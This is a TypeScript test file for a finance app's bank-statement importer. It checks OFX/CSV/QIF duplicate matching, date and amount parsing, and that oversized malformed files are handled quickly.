      .map(([f, d, a, n]) => `<STMTTRN><TRNTYPE>DEBIT<DTPOSTED>${d}<TRNAMT>${a}<FITID>${f}<NAME>${n}</STMTTRN>`)
      .join('')}</BANKTRANLIST></STMTRS></STMTTRNRS></BANKMSGSRSV1></OFX>`;
  const rowsOf = (text: string) => rows(ready(text).records).rows.map((x) => x.row);
  const store = (list: ImportRow[], prefix: string): StoredRow[] => list.map((r, i) => ({ id: `manual-txn:${prefix}${i}`, ...r }));

  test('a bank numbering each download from 1: October’s rows are never taken for September’s', () => {
    const sep = store(rowsOf(ofxOf([['1', '20260905', -12.5, 'GROCER'], ['2', '20260910', -1500, 'RENT'], ['3', '20260920', 2400, 'PAYROLL']])), 's');
    const oct = rowsOf(ofxOf([['1', '20261003', -48.2, 'PHARMACY'], ['2', '20261005', -1500, 'RENT'], ['3', '20261006', -9.99, 'NETFLIX'], ['4', '20261007', 2400, 'PAYROLL']]));
    expect(matchRows(oct, sep)).toEqual([
      // Nothing alike: another purchase, imported as new unless the person says otherwise.
      { outcome: 'conflict', row_id: 'manual-txn:s0', differs: { name: true, amount: true, date: true }, suggested: 'new' },
      // The same rent, a month on: alike enough that the person is asked.
      { outcome: 'conflict', row_id: 'manual-txn:s1', differs: { name: false, amount: false, date: true }, suggested: null },
      { outcome: 'conflict', row_id: 'manual-txn:s2', differs: { name: true, amount: true, date: true }, suggested: 'new' },
      { outcome: 'new' },
    ]);
  });

  test('downloaded daily, renumbered each time: a FITID now on another purchase of the same amount takes nothing from the row that is it', () => {
    // October 1 to 4, then 2 to 5: every transaction moves down one number.
    const first = store(
      rowsOf(ofxOf([['1', '20261001', -4.5, 'BLUE BOTTLE'], ['2', '20261002', -4.5, 'STARBUCKS'], ['3', '20261003', -20, 'ATM CASH'], ['4', '20261004', -20, 'LYFT RIDE']])),
      'd'
    );
    const next = rowsOf(ofxOf([['1', '20261002', -4.5, 'STARBUCKS'], ['2', '20261003', -20, 'ATM CASH'], ['3', '20261004', -20, 'LYFT RIDE'], ['4', '20261005', -4.5, 'PEETS COFFEE']]));
    expect(matchRows(next, first)).toEqual([
      { outcome: 'present', row_id: 'manual-txn:d1', by: 'content' },
      { outcome: 'present', row_id: 'manual-txn:d2', by: 'content' },
      { outcome: 'present', row_id: 'manual-txn:d3', by: 'content' },
      { outcome: 'new' },
    ]);
  });

  test('renumbered, but the same transactions: found by what they say, and no conflict', () => {
    const first = store(rowsOf(ofxOf([['1', '20261001', -4.5, 'COFFEE'], ['2', '20261003', -60, 'GAS STATION']])), 'f');
    // The next download starts on the 3rd: the gas is now "1", a new lunch "2".
    const next = rowsOf(ofxOf([['1', '20261003', -60, 'GAS STATION'], ['2', '20261004', -15, 'LUNCH']]));
    expect(matchRows(next, first)).toEqual([{ outcome: 'present', row_id: 'manual-txn:f1', by: 'content' }, { outcome: 'new' }]);
  });

  test('one FITID on two purchases in one file: both read, the second naming the first', () => {
    const dup = rowsOf(ofxOf([['20261005', '20261005', -4.5, 'COFFEE'], ['20261005', '20261005', -60, 'GAS STATION']]));
    expect(matchRows(dup, [])).toEqual([{ outcome: 'new' }, { outcome: 'new', shares_id_with: 0 }]);
    // The same transaction listed twice is still one.
    const twice = rowsOf(ofxOf([['X', '20261005', -4.5, 'COFFEE'], ['X', '20261005', -4.5, 'COFFEE']]));
    expect(matchRows(twice, [])).toEqual([{ outcome: 'new' }, { outcome: 'repeated', of: 0 }]);
    // A bank that uses the day as its FITID: two purchases of one amount that
    // day are two, as their payees say.
    const sameDay = rowsOf(ofxOf([['20261005', '20261005', -5, 'COFFEE'], ['20261005', '20261005', -5, 'BAKERY']]));
    expect(matchRows(sameDay, [])).toEqual([{ outcome: 'new' }, { outcome: 'new', shares_id_with: 0 }]);
  });

  test('a pending charge that posted at a new amount under its FITID is asked about, never dropped', () => {
    const pending = store(rowsOf(ofxOf([['P9', '20261001', -50, 'BISTRO']])), 'p');
    const posted = rowsOf(ofxOf([['P9', '20261003', -60, 'BISTRO']]));
    expect(matchRows(posted, pending)).toEqual([{ outcome: 'conflict', row_id: 'manual-txn:p0', differs: { name: false, amount: true, date: true }, suggested: null }]);
  });

  test(`the same amount posted within ${FITID_DAYS} days, or exactly what was imported however edited since, is already there`, () => {
    const pending = store(rowsOf(ofxOf([['P1', '20260901', -50, 'PENDING BISTRO']])), 'q');
    expect(matchRows(rowsOf(ofxOf([['P1', '20260904', -50, 'BISTRO #12']])), pending)).toEqual([{ outcome: 'present', row_id: 'manual-txn:q0', by: 'id' }]);
    expect(matchRows(rowsOf(ofxOf([['P1', '20260912', -50, 'PENDING BISTRO']])), pending)[0]).toMatchObject({ outcome: 'conflict', suggested: null });
    // Corrected by hand to another amount and day: the same file again still knows it.
    const edited = [{ ...pending[0], amount: 55, date: '2026-08-20', name: 'Bistro (tip)' }];
    expect(edited[0].source_key).toBe(keyHash(contentKey({ date: '2026-09-01', amount: 50, currency: 'USD', name: 'PENDING BISTRO' })));
    expect(matchRows(rowsOf(ofxOf([['P1', '20260901', -50, 'PENDING BISTRO']])), edited)).toEqual([{ outcome: 'present', row_id: 'manual-txn:q0', by: 'id' }]);
  });

  test('a CSV row corrected to what the bank later says is matched by what it says now as well, still once', () => {
    const csvText = (amount: string) => `Date,Description,Amount\n2026-10-01,BISTRO,${amount}\n`;
    const mapping = { csv: { columns: { date: 0, description: 1, amount: 2 }, sign: 'negative-out' as const } };
    const [imported] = store(rows(ready(csvText('-50.00'), mapping).records).rows.map((x) => x.row), 'c');
    // The person corrects it to the posted amount.
    const corrected = { ...imported, amount: 60 };
    const posted = rows(ready(csvText('-60.00'), mapping).records).rows.map((x) => x.row);
    expect(matchRows(posted, [corrected])).toEqual([{ outcome: 'present', row_id: corrected.id, by: 'content' }]);
    // The first file again still knows it by the key it was imported with.
    const again = rows(ready(csvText('-50.00'), mapping).records).rows.map((x) => x.row);
    expect(matchRows(again, [corrected])).toEqual([{ outcome: 'present', row_id: corrected.id, by: 'content' }]);
    // Both in one file: the one stored row matches one of them, the other is new.
    expect(countOutcomes(matchRows([...again, ...posted], [corrected]))).toEqual({ new: 1, present: 1, repeated: 0, conflict: 0 });
  });
});

describe('reading a CSV file again as its mapping changes', () => {
  test('from the table already read, only the first rows’ records, with the dates’ order found from every row', () => {
    // Twenty rows whose dates fit both orders, then one that fits only day first.
    const lines = Array.from({ length: 20 }, (_, i) => `0${(i % 9) + 1}/02/2026,Row ${i},-1.00`);
    const text = ['Date,Description,Amount', ...lines, '13/02/2026,Late,-2.00'].join('\n');
    const table = readCsvTable(text);
    if ('error' in table) throw new Error(table.error);
    const options = { csv: { columns: { date: 0, description: 1, amount: 2 }, sign: 'negative-out' as const } };
    const head = readImport(text, { format: 'csv', options, thisYear: YEAR, table, limit: 5 });
    if (head.status !== 'ready') throw new Error(head.status);
    expect(head.records).toHaveLength(5);
    expect(head.read).toMatchObject({ date_order: 'dmy', order_open: false });
    expect(head.records[0].date).toBe('2026-02-01');
    // Read in full from the same table, the same answer for every row.
    const all = readImport(text, { format: 'csv', options, thisYear: YEAR, table });
    expect(all.status === 'ready' ? all.records.length : all.status).toBe(21);
  });
});

describe('the review’s other probes, kept as tests', () => {
  test('dates as banks and Quicken write them', () => {
    const cases: [string, ReturnType<typeof readDateText>][] = [
      ["1/2'26", { kind: 'ordered', mdy: '2026-01-02', dmy: '2026-02-01' }],
      ["1/ 2'26", { kind: 'ordered', mdy: '2026-01-02', dmy: '2026-02-01' }],
      ["1/2' 5", { kind: 'ordered', mdy: '2005-01-02', dmy: '2005-02-01' }],
      ["12/31'99", { kind: 'ordered', mdy: '2099-12-31', dmy: null }],
      ['12/31/99', { kind: 'ordered', mdy: '1999-12-31', dmy: null }],
      ['12/31/27', { kind: 'ordered', mdy: '2027-12-31', dmy: null }],
      ['12/31/28', { kind: 'ordered', mdy: '1928-12-31', dmy: null }],
      ['1/1/00', { kind: 'fixed', day: '2000-01-01', style: 'numeric' }],
      ['1/2/5', null],
      ['D1/2\'26', null],
      ["13/1'26", { kind: 'ordered', mdy: null, dmy: '2026-01-13' }],
      ['2026/10/09', { kind: 'fixed', day: '2026-10-09', style: 'iso' }],
      ['9.10.26', { kind: 'ordered', mdy: '2026-09-10', dmy: '2026-10-09' }],
      ['30-Sep-26', { kind: 'fixed', day: '2026-09-30', style: 'named' }],
      ['30 Sept 2026', { kind: 'fixed', day: '2026-09-30', style: 'named' }],
      ['2026-10-09T23:59:59-05:00', { kind: 'fixed', day: '2026-10-09', style: 'iso' }],
      ['10/09/2026 11:30 PM', { kind: 'ordered', mdy: '2026-10-09', dmy: '2026-09-10' }],
      ['29/02/2025', null],
      ['02/29/2028', { kind: 'ordered', mdy: '2028-02-29', dmy: null }],
    ];
    for (const [text, read] of cases) expect(readDateText(text, YEAR), text).toEqual(read);
    for (const [text, day] of [
      ['20261005235959[-5:EST]', '2026-10-05'],
      ['20261006043000.000[0:GMT]', '2026-10-06'],
      ['20261005T120000', '2026-10-05'],
      ['20261005120000.000[-5]', '2026-10-05'],
      ['  20261005  ', '2026-10-05'],
      ['20261032', null],
      ['20260229', null],
      ['20280229', '2028-02-29'],
    ] as const) {
      expect(ofxDay(text), text).toBe(day);
    }
  });

  test('amounts as banks write them, with a point or a comma for decimals', () => {
    const cases: [string, ReturnType<typeof readAmount>, ReturnType<typeof readAmount>][] = [
      ['$1,234.56', { value: 1234.56 }, null],
      ['$-1,234.56', { value: -1234.56 }, null],
      ['($1,234.56)', { value: -1234.56 }, null],
      ['1,234.56-', { value: -1234.56 }, null],
      ['€1.234,56', null, { value: 1234.56 }],
      ['1 234,56', null, { value: 1234.56 }],
      ['12.34 CR', { value: 12.34, direction: 'in' }, null],
      ['12.34DR', { value: 12.34, direction: 'out' }, null],
      ['−12.34', { value: -12.34 }, null],
      ['.5', { value: 0.5 }, null],
      ['1,2345.00', null, null],
      ['USD 12.34', null, null],
      ['(12.34)-', null, null],
      ['1e3', null, null],
      ['0x10', null, null],
      ['1,234', { value: 1234 }, { value: 1.234 }],
      ["1'234.50", { value: 1234.5 }, null],
      ['--12', null, null],
      ['12,345,678.90', { value: 12345678.9 }, null],
      ['1.2.3', null, null],
    ];
    for (const [text, point, comma] of cases) {
      expect(readAmount(text, '.'), `${text} with a point`).toEqual(point);
      expect(readAmount(text, ','), `${text} with a comma`).toEqual(comma);
    }
  });

  test('separate money-out and money-in columns: each odd line read or refused as it should be', () => {
    const csv = [
      'Date,Description,Debit,Credit',
      '2026-10-01,Coffee,4.50,',
      '2026-10-02,Pay,,1000.00',
      '2026-10-03,Both zero,0.00,0.00',
      '2026-10-04,Debit zero credit,0.00,12.00',
      '2026-10-05,Negative debit,-20.00,',
      '2026-10-06,Paren credit,,(5.00)',
      '2026-10-07,Both,1.00,2.00',
      '2026-10-08,Neither,,',
      '2026-10-09,Symbols,$1,234.56,',
    ].join('\n');
    const r = ready(csv, { csv: { columns: { date: 0, description: 1, debit: 2, credit: 3 }, sign: 'negative-out' } });
    const n = rows(r.records);
    expect(n.rows.map((x) => [x.line, x.row.amount])).toEqual([
      [2, 4.5],
      [3, -1000],
      [5, -12],
      [6, 20],
      [7, -5],
    ]);
    expect([...r.problems, ...n.problems].map((p) => [p.line, p.reason])).toEqual([
      [8, 'It has both money out and money in.'],
      [9, 'It has no amount.'],
      [10, 'This line has 5 fields where the others have 4: a description may hold an unquoted ",".'],
      [4, 'Its amount is zero.'],
    ]);
  });

  test('every hostile file the review tried is read or refused quickly, with a small answer', () => {
    const MB3 = 3 * 1024 * 1024;
    const fill = (unit: string, prefix = '', suffix = '') => {
      const n = Math.max(0, Math.floor((MB3 - prefix.length - suffix.length) / unit.length));
      return prefix + unit.repeat(n) + suffix;
    };
    const ofxHead = '<OFX><BANKMSGSRSV1><STMTTRNRS><STMTRS><CURDEF>USD<BANKTRANLIST>';
    const files = [
      fill('<A>', ofxHead),
      fill('<STMTTRN>', ofxHead, '</STMTTRN>'.repeat(10)),
      fill('<STMTTRN><TRNAMT>-1.00<DTPOSTED>20261001<FITID>x<NAME>y', ofxHead),
      fill('<A' + ' '.repeat(199) + '<', ofxHead),
      fill('<', ofxHead),
      fill('&#x10FFFF;&amp;&#1234567;', ofxHead + '<STMTTRN><NAME>'),
      ofxHead + '<!--' + 'x'.repeat(MB3 - 100),
      fill('<![CDATA[<x>]]>', ofxHead + '<STMTTRN><NAME>'),
      'Date,Description,Amount\n2026-10-01,"' + 'x'.repeat(MB3 - 100) + '",1\n',
      '\n'.repeat(MB3),
      '"'.repeat(MB3),
      fill('"",', 'Date,Description,Amount\n'),
      fill('Mxxxxxxxxx\n', '!Type:Bank\nD1/1/26\nT-1\nPa\n'),
      fill('D1/13/26\nT-1\nPa\n^\n', '!Type:Bank\n'),
    ];
    for (const file of files) {
      const started = performance.now();
      const r = readImport(file, { options: {}, thisYear: YEAR });
      expect(performance.now() - started, file.slice(0, 40)).toBeLessThan(3000);
      // Whatever it is, what is answered stays small: a question, an error,
      // or records with at most 10,000 rows of bounded fields.
      const answer = r.status === 'ready' ? { ...r, records: r.records.length, problems: r.problems.length } : r;
      expect(JSON.stringify(answer).length, file.slice(0, 40)).toBeLessThan(250_000);
    }
  }, 60_000);
});
